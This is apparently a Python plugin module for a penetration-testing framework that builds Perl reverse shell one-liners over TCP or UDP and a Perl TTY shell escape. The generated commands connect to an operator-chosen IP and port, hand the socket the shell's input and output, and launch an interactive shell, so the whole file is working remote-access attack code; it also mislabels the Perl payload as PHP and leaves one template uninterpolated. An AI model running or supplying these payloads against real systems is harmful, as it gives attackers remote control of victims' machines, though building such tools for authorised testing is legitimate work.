from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )

        self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = f"""perl -e 'use Socket;$i="{self.args.ip}";$p={self.args.port};"""
        if self.is_udp:
            self.shell += """socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,"""
        else:
            self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,"""
        self.shell += """sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
        self.shell += f"""exec("{self.args.shell} -i");"""
        self.shell += """};'"""


class TTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[TTYShell] Perl TTY shell escape from https://netsec.ws/?p=337"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = """perl -e 'exec "{self.args.shell}"'"""


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.is_udp = True
        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."